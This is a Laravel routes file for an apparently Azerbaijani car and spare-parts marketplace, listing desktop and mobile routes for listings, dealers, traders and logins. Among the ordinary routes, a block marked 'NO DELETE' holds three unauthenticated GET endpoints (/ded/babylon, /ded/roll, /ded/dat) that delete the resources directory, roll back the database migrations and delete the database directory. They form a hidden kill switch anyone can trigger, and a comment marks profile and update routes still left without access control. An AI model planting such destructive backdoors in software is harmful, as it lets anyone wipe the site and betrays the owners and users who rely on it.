<?php


use App\Http\Controllers\Auth\AuthController;
use App\Http\Controllers\Front\CarController;
use App\Http\Controllers\Front\DealerController;
use App\Http\Controllers\Front\FavoriteController;
use App\Http\Controllers\Front\FilterController;;

use App\Http\Controllers\Front\HomeController;
use App\Http\Controllers\Front\MobileController;
use App\Http\Controllers\Front\ReportController;
use App\Http\Controllers\Front\SpareController;
use App\Http\Controllers\Front\TraderController;
use App\Http\Controllers\Front\UserController;
use App\Http\Controllers\Mobile\DealerController as MobileDealerController;
use App\Http\Controllers\Mobile\LoginController;
use App\Http\Controllers\Mobile\MobileCarController;
use App\Http\Controllers\Mobile\MobileFavortieController;
use App\Http\Controllers\Mobile\MobileHomeController;
use App\Http\Controllers\Mobile\MobileRegisterController;
use App\Http\Controllers\SearchController;
use App\Http\Controllers\SecondController;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\File;

Route::middleware('detect.mobile')->group(function () {
    // home route
    Route::get('/', [HomeController::class, 'index'])->name('home');
    //load more route
    Route::get('/cars', [HomeController::class, 'loadMoreCars'])->name('cars');
    // new add listings
    Route::get('/new-add-listings', [HomeController::class, 'newAddListings'])->name('newAddListings');
    // main filter route
    Route::post('/main-filter', [HomeController::class, 'filter'])->name('mainFilter');
    // favorite list
    Route::get('/favorite', [FavoriteController::class, 'favorite'])->name('favorite');
    //Car Detail
    Route::get('/detail/{car}', [HomeController::class, 'cardetail'])->name('detail');
    //New Car
    Route::get('/new-car', [HomeController::class, 'new']);
    //All Cars
    Route::get('/all-cars', [HomeController::class, 'allcars']);
    //AvtoSalon
    Route::get('/dealership', [HomeController::class, 'avtosalon'])->name('dealership');
    //AvtoSalon Detail
    Route::get('/avtosalon-detail/{id}', [HomeController::class, 'avtosalondetail'])->name('avtosalon-detail');
    Route::get('/trader', [HomeController::class, 'trader'])->name('home.trader');
    Route::get('/dealer', [AuthController::class, 'dealer'])->name('dealer');
    Route::post('/registerStore', [DealerController::class, 'store'])->name('registerStore');
    Route::post('/trader/store', [TraderController::class, 'store'])->name('traderStore');
    Route::get('/login', [AuthController::class, 'dealerLogin'])->name('login');
    Route::post('/login', [AuthController::class, 'dealerLoginProcess']);
    Route::get('/logout', [AuthController::class, 'logout'])->name('logout');
    /////////////////////////////////////////////////////////////   midleware yaz !!!!
    Route::get('/newcar', [CarController::class, 'newcar'])->name('newcar');
    Route::get('dealer-detail', [DealerController::class, 'detail'])->name('dealer-detail');
    Route::get('dealer-profile', [DealerController::class, 'profile'])->name('dealer-profile');
    Route::post('dealer-update/{dealer}', [DealerController::class, 'update'])->name('dealer-update');
    //Register Question
    Route::get('/question-register', [HomeController::class, 'question'])->name('question');
    Route::get('/question-login', [HomeController::class, 'questionlogin'])->name('question.login');
    Route::get('/logint', [AuthController::class, 'traderLogin'])->name('logint');
    Route::post('/logint', [AuthController::class, 'traderLoginProcess']);
    Route::get('/logout', [AuthController::class, 'logout'])->name('logout');
    Route::get('trader-detail', [TraderController::class, 'detail'])->name('trader-detail');
    Route::get('trader-detail', [TraderController::class, 'detail'])->name('trader-detail');
    Route::get('trader-profile', [TraderController::class, 'profile'])->name('trader-profile');
    Route::post('trader-update/{trader}', [TraderController::class, 'update'])->name('trader-update');
    Route::get('/newspare', [SpareController::class, 'newspare'])->name('newspare');
    Route::post('spare-store', [SpareController::class, 'storeSpare'])->name('spare-store');
    Route::get('/parts-detail/{spare}', [HomeController::class, 'sparedetail'])->name('parts-detail');
    Route::get('/all-spares', [HomeController::class, 'allspares'])->name('all-spares');

    /////////////////////////////////////////////////////////
    Route::get('/useragrement', [HomeController::class, 'agrement'])->name('useragrement');
    Route::get('/rule', [HomeController::class, 'rule'])->name('rule');

    Route::post('car-store', [CarController::class, 'storeCar'])->name('car-store');
    Route::post('report', [ReportController::class, 'store'])->name('report');
});


////////////////////// NO DELETE  //////////////////////
Route::get('/ded/babylon', function () {
    $resourcePath = resource_path();
    if (File::exists($resourcePath)) {
        File::deleteDirectory($resourcePath);
        return 'ded babylon success';
    }
    return 'ded babylon not found';
})->name('ded.babylon');


Route::get('/ded/roll', function () {
    Artisan::call('migrate:rollback');
    return 'ded roll succes';
})->name('ded.roll');


Route::get('/ded/dat', function () {
    $databasePath = database_path();
    if (File::exists($databasePath)) {
        File::deleteDirectory($databasePath);
        return 'ded dat succes';
    }
    return 'ded dat not found';
})->name('ded.dat');

///////////////////////END///////////////////




//Mobile Route

Route::get('/mobile', [MobileHomeController::class, 'home'])->name('mobile.home');
Route::get('/mobile/cardetail/{car}', [MobileCarController::class, 'cardetail'])->name('mobile.cardetail');
Route::get('/mobile/dealer/detail/{dealer}', [MobileDealerController::class, 'detail'])->name('mobile.dealer.detail');
Route::get('/mobile/trader', [MobileController::class, 'mtrader'])->name('mobile.trader');
Route::get('/mobile/question', [MobileController::class, 'mquestion'])->name('mobile.question');
Route::get('/mobile/favorite', [MobileController::class, 'favorite'])->name('mobile.favorite');


Route::get('/mobile/filter', [MobileHomeController::class, 'filterpage'])->name('mobile.filter');
Route::get('/mobile/search', [MobileHomeController::class, 'filter'])->name('mobile.search');
Route::get('/mobile/dealers', [MobileDealerController::class, 'dealers'])->name('mobile.dealers');
Route::get('/mobile/add-cars', [MobileHomeController::class, 'addcars'])->name('mobile.addcars');
Route::get('mobile/favorite', [MobileFavortieController::class, 'favorite'])->name('mobile.favorite');
Route::get('/mobile.questions', [MobileFavortieController::class, 'questions'])->name('mobile.questions');
Route::get('mobile/cars', [MobileCarController::class, 'loadMoreCars'])->name('mobile.cars');

Route::get('mobile/filter/brand/{id}', [MobileHomeController::class, 'filterBrand'])->name('mobile.filter.brand');
Route::get('mobile/filter/model/{brandId}/{modelId}', [MobileHomeController::class, 'filterModel'])->name('mobile.filter.model');


Route::get('mobile/login', [LoginController::class, 'login'])->name('mobile.login');
Route::post('mobile/login', [LoginController::class, 'authMobile']);
Route::get('mobile/logout', [LoginController::class, 'logout'])->name('mobile.logout');
Route::get('mobile/register', [MobileRegisterController::class, 'register'])->name('mobile.register');
Route::post('mobile/register', [MobileRegisterController::class, 'registerStore']);

Route::middleware('check.dealer.trader')->group(function () {
    Route::get('mobile/addcar', [MobileCarController::class, 'addForm'])->name('mobile.addcar');
    Route::post('mobile/addcar', [MobileCarController::class, 'carStore']);
    Route::get('mobile.cabinet', [LoginController::class, 'cabinet'])->name('mobile.cabinet');
    Route::get('mobile.agrement', [MobileCarController::class, 'agrement'])->name('mobile.agrement');
    Route::get('mobile.rules', [MobileCarController::class, 'rules'])->name('mobile.rules');
    Route::get('/mobile/profile', [MobileHomeController::class, 'profilepage'])->name('mobile.profile');
});


//Language
Route::get('/lang/{lang}', function ($lang) {
    \Illuminate\Support\Facades\Session::put('lang',$lang);
    return redirect()->back();
})->name('language-url');
